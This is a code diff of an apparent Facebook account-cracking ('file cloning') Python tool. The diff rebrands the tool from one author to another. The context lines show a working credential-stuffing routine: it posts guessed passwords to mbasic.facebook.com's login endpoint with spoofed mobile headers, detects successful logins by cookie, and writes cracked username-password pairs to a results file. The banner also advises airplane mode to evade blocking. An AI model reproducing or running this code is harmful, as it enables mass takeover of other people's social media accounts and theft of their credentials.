@@ -126,7 +126,7 @@ header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-f
 def main():
 	os.system('clear');print(banner)                                          
 	print('\033[1;32m        ┌─────────────────────────────────┐') 
-	print("\033[1;92m\t│\033[1;92mWELLCOME TO ABDULLAH     \033[1;92m      │")
+	print("\033[1;92m\t│\033[1;92mWELLCOME TO SHADIN     \033[1;92m      │")
 	print('\033[1;32m┌────────────────────────────────────────────┐') 
 	print('\033[1;92m│\033[1;37m[01] \033[1;92mFILE CLONING   \033[1;37m[\033[1;32mCP/OK MIX IDS\033[1;37m] \033[1;31m(\033[1;32mFAST\033[1;31m) \033[1;32m │ ')
 	print('\033[1;92m│\033[1;37m[02] \033[1;92mFILE CLONING   \033[1;37m[\033[1;33mONLY OK IDS  \033[1;37m] \033[1;31m(\033[1;32mSLOW\033[1;31m) \033[1;32m │')
@@ -346,10 +346,10 @@ class __filecrack3__:
 			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				print('\r\033[1;37m[\033[1;32mABDULLAH-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
+				print('\r\033[1;37m[\033[1;32mSHADIN-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
-				open('ABDULLAH_Ok.txt','a').write('%s\n' % wrt)
+				open('SHADIN_Ok.txt','a').write('%s\n' % wrt)
 				break
 			elif 'checkpoint' in ses.cookies.get_dict():
 				print('\r\033[1;37m[\033[1;31m𝗥J-CP\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
@@ -440,7 +440,7 @@ class __filecrack3__:
 			time.sleep(1)
 			print('\033[1;37m[+]\033[1;33m FILE CLONING ONLY OK IDS ')
 			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
-			print('\033[1;37m[+]\033[1;36mABDULLAH PROCESS HAS BEEN STARTED')
+			print('\033[1;37m[+]\033[1;36mSHADIN PROCESS HAS BEEN STARTED')
 			print(50*"\033[1;97m_")
 			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
 			print(50*"\033[1;97m_")
@@ -483,20 +483,18 @@ class load:
 			time.sleep(0.1)
 		print('\n')
 banner = """   
- $$$$$$\  $$$$$$$\  $$$$$$$\  $$\   $$\ $$\       $$\        $$$$$$\  $$\   $$\ 
-$$  __$$\ $$  __$$\ $$  __$$\ $$ |  $$ |$$ |      $$ |      $$  __$$\ $$ |  $$ |
-$$ /  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |      $$ |      $$ /  $$ |$$ |  $$ |
-$$$$$$$$ |$$$$$$$\ |$$ |  $$ |$$ |  $$ |$$ |      $$ |      $$$$$$$$ |$$$$$$$$ |
-$$  __$$ |$$  __$$\ $$ |  $$ |$$ |  $$ |$$ |      $$ |      $$  __$$ |$$  __$$ |
-$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |      $$ |      $$ |  $$ |$$ |  $$ |
-$$ |  $$ |$$$$$$$  |$$$$$$$  |\$$$$$$  |$$$$$$$$\ $$$$$$$$\ $$ |  $$ |$$ |  $$ |
-\__|  \__|\_______/ \_______/  \______/ \________|\________|\__|  \__|\__|  \__|                                                                                                                                                                                                                                                                                 
+ ░██████╗██╗░░██╗░█████╗░██████╗░██╗███╗░░██╗
+██╔════╝██║░░██║██╔══██╗██╔══██╗██║████╗░██║
+╚█████╗░███████║███████║██║░░██║██║██╔██╗██║
+░╚═══██╗██╔══██║██╔══██║██║░░██║██║██║╚████║
+██████╔╝██║░░██║██║░░██║██████╔╝██║██║░╚███║
+╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝                                                                                                                                                                                                                                                                                
 =================================================
-    [-] AUTHOR    :\033[1;32m Mohammed Abdullah
-    [-] GITHUB    :\033[1;32m Abdullah
+    [-] AUTHOR    :\033[1;32m Shadin Obroy
+    [-] GITHUB    :\033[1;32m Shadin
     [-] WhatsApp  :\033[1;32m 019
     [-] TOOLS     :\033[1;32m FILE CLONE
-    [-] VERSION   :\033[1;32m 1.2
+    [-] VERSION   :\033[1;32m 1.0
     [-] STATUS    :\033[1;32m Free
 ================================================== """                         
 ct = datetime.now()
